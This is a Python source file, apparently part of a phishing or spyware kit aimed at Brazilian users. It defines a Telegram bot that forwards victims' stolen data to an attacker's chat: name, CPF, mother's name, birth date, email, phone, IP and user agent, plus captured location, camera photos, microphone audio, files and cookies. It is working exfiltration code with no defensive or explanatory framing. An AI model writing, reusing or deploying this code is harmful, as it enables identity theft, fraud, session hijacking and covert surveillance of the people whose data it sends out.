import requests
import json
from config import Config

class TelegramBot:
    def __init__(self):
        self.token = Config.TELEGRAM_TOKEN
        self.chat_id = Config.TELEGRAM_CHAT_ID
        self.base_url = f"https://api.telegram.org/bot{self.token}"
    
    def enviar_mensagem(self, texto):
        url = f"{self.base_url}/sendMessage"
        payload = {
            'chat_id': self.chat_id,
            'text': texto,
            'parse_mode': 'HTML'
        }
        
        try:
            response = requests.post(url, data=payload)
            return response.status_code == 200
        except:
            return False
    
    def enviar_arquivo(self, arquivo, filename, caption=""):
        url = f"{self.base_url}/sendDocument"
        files = {'document': (filename, arquivo)}
        data = {'chat_id': self.chat_id, 'caption': caption}
        
        try:
            response = requests.post(url, files=files, data=data)
            return response.status_code == 200
        except:
            return False
    
    def notificar_novo_lead(self, dados_lead):
        mensagem = f"""
🚨 <b>NOVO LEAD CAPTURADO!</b>

👤 <b>Dados Pessoais:</b>
├ Nome: <code>{dados_lead['nome']}</code>
├ CPF: <code>{dados_lead['cpf']}</code>
├ Mãe: <code>{dados_lead['nome_mae']}</code>
├ Nascimento: <code>{dados_lead['nascimento']}</code>
├ Email: <code>{dados_lead['email']}</code>
├ Telefone: <code>{dados_lead['telefone']}</code>
└ Categoria: {dados_lead['categoria']}

🌐 <b>Informações Técnicas:</b>
├ IP: <code>{dados_lead.get('ip', 'N/A')}</code>
├ User Agent: {dados_lead.get('user_agent', 'N/A')}
└ Data: {dados_lead.get('data', 'N/A')}
        """
        return self.enviar_mensagem(mensagem)
    
    def notificar_clique(self, pagina, dados_cliente):
        mensagem = f"""
👁️ <b>NOVO CLIQUE DETECTADO!</b>

📄 Página: <code>{pagina}</code>
🌐 IP: <code>{dados_cliente.get('ip', 'N/A')}</code>
🖥️ User Agent: {dados_cliente.get('user_agent', 'N/A')}
🕒 Data: {dados_cliente.get('timestamp', 'N/A')}
        """
        return self.enviar_mensagem(mensagem)
    
    def enviar_dados_coletados(self, tipo, dados, lead_info=None):
        if tipo == "localizacao":
            mensagem = f"""
📍 <b>LOCALIZAÇÃO CAPTURADA!</b>

👤 Lead: <code>{lead_info}</code>
📌 Latitude: <code>{dados.get('latitude')}</code>
📌 Longitude: <code>{dados.get('longitude')}</code>
🎯 Precisão: {dados.get('accuracy')}m
🗺️ Maps: https://maps.google.com/?q={dados.get('latitude')},{dados.get('longitude')}
            """
        
        elif tipo == "camera":
            mensagem = f"""
📷 <b>FOTO CAPTURADA!</b>

👤 Lead: <code>{lead_info}</code>
🖼️ Imagem salva e enviada como arquivo
            """
        
        elif tipo == "microfone":
            mensagem = f"""
🎤 <b>ÁUDIO CAPTURADO!</b>

👤 Lead: <code>{lead_info}</code>
🎵 Áudio salvo e enviado como arquivo
            """
        
        elif tipo == "arquivos":
            mensagem = f"""
📁 <b>ARQUIVOS CAPTURADOS!</b>

👤 Lead: <code>{lead_info}</code>
📊 Total de arquivos: {len(dados)}
📝 Tipos: {', '.join(set(dados))}
            """
        
        elif tipo == "cookies":
            mensagem = f"""
🍪 <b>COOKIES CAPTURADOS!</b>

👤 Lead: <code>{lead_info}</code>
🔐 Total de cookies: {len(dados)}
            """
        
        else:
            mensagem = f"""
📊 <b>DADOS CAPTURADOS - {tipo.upper()}</b>

👤 Lead: <code>{lead_info}</code>
📝 Dados: {str(dados)[:200]}...
            """
        
        return self.enviar_mensagem(mensagem)
